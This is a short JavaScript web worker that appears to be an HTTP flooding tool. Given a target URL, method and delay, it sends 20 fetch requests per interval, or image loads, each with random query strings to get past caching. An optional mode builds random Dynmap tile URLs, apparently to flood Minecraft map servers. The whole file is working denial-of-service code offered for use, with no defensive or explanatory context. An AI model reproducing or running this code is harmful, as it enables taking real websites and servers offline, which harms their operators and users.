function makeid(length) {
    let result = '';
    let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

self.addEventListener('message', (message) => {
    let { target, method, delay, useImg, dynmap } = JSON.parse(message.data);
    setInterval(() => {
        if (useImg) {
            if (method == "GET") {
                let img = new Image();
                img.src = target + "?" + makeid(8);
            }
        } else {
            for (let i = 0; i < 20; i++) {
                let targetURL = target + "?" + makeid(8);
                if (dynmap) {
                    targetURL = `${target}/tiles/world/flat/${Math.floor(Math.random() * 10)}_${Math.floor(Math.random() * 10)}/zzzzz_${Math.floor(Math.random() * 128)}_${Math.floor(Math.random() * 128)}.jpg?timestamp=${Math.floor(Math.random() * 100000000)}`
                }
                fetch(targetURL, {
                    method
                }).catch(() => { });
            }
        }
    }, delay);
});


